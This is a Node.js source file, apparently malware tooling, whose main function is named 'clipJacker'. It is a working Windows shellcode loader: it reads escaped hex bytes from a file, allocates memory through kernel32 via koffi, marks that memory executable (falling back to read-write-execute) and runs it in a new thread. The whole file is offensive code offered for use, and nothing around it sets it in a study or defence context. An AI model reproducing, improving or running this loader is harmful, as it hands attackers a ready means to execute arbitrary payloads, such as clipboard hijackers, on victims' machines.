'use strict';

const fs = require('fs').promises;
const koffi = require('koffi');

/* ────────────────────────────
   CONFIG / CONSTANTS
──────────────────────────── */
const DEFAULT_SHELLCODE_FILE = './bytes.h';

const MEM_COMMIT  = 0x1000;
const MEM_RESERVE = 0x2000;

const PAGE_READWRITE         = 0x04;
const PAGE_EXECUTE_READ      = 0x20;
const PAGE_EXECUTE_READWRITE = 0x40;

const INFINITE = 0xFFFFFFFF;

/* ────────────────────────────
   SIMPLE LOGGER
──────────────────────────── */
function log(level, msg, extra = '') {
  const ts = new Date().toISOString();
  console.log(`[${ts}] [${level}] ${msg}`, extra);
}

/* ────────────────────────────
   SHELLCODE PARSER (FAST)
──────────────────────────── */
function parseShellcode(content) {
  const bytes = [];
  let idx = 0;

  while ((idx = content.indexOf('\\x', idx)) !== -1) {
    const hex = content.slice(idx + 2, idx + 4);
    if (hex.length !== 2 || isNaN(parseInt(hex, 16))) {
      throw new Error(`Invalid hex byte near offset ${idx}`);
    }
    bytes.push(parseInt(hex, 16));
    idx += 4;
  }

  if (bytes.length === 0) {
    throw new Error('No \\xNN shellcode bytes found');
  }

  return Buffer.from(bytes);
}

/* ────────────────────────────
   MAIN
──────────────────────────── */
async function clipJacker(filePath = DEFAULT_SHELLCODE_FILE) {
  log('INFO', `Reading shellcode from ${filePath}`);

  let raw;
  try {
    raw = await fs.readFile(filePath, 'utf8');
  } catch (e) {
    throw new Error(`File read failed: ${e.message}`);
  }

  const shellcode = parseShellcode(raw);
  const size = shellcode.length;

  log('INFO', 'Shellcode parsed', `${size} bytes`);

  /* ── WinAPI bindings ── */
  const kernel32 = koffi.load('kernel32.dll');

  const VirtualAlloc = kernel32.func(
    'void* __stdcall VirtualAlloc(void*, size_t, uint32_t, uint32_t)'
  );

  const VirtualProtect = kernel32.func(
    'bool __stdcall VirtualProtect(void*, size_t, uint32_t, uint32_t*)'
  );

  const RtlCopyMemory = kernel32.func(
    'void __stdcall RtlCopyMemory(void*, const void*, size_t)'
  );

  const CreateThread = kernel32.func(
    'void* __stdcall CreateThread(void*, size_t, void*, void*, uint32_t, uint32_t*)'
  );

  const WaitForSingleObject = kernel32.func(
    'uint32_t __stdcall WaitForSingleObject(void*, uint32_t)'
  );

  /* ── Allocate memory ── */
  const addr = VirtualAlloc(
    null,
    size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
  );

  if (!addr) {
    throw new Error('VirtualAlloc failed');
  }

  log('INFO', 'Memory allocated', addr);

  /* ── Copy payload ── */
  RtlCopyMemory(addr, shellcode, size);
  log('INFO', 'Shellcode copied');

  /* ── Change protection ── */
  const oldProtect = Buffer.alloc(4);

  if (!VirtualProtect(addr, size, PAGE_EXECUTE_READ, oldProtect)) {
    log('WARN', 'RX failed, falling back to RWX');

    if (!VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, oldProtect)) {
      throw new Error('VirtualProtect failed (RX & RWX)');
    }

    log('INFO', 'Memory protection set to RWX');
  } else {
    log('INFO', 'Memory protection set to RX');
  }

  /* ── Execute ── */
  const threadId = Buffer.alloc(4);
  const thread = CreateThread(null, 0, addr, null, 0, threadId);

  if (!thread) {
    throw new Error('CreateThread failed');
  }

  log('INFO', 'Thread started', `ID=${threadId.readUInt32LE(0)}`);

  WaitForSingleObject(thread, INFINITE);

  log('INFO', 'Execution finished');
}

/* ────────────────────────────
   CLI
──────────────────────────── */
clipJacker(process.argv[2]).catch(err => {
  log('ERROR', err.message);
  process.exit(1);
});
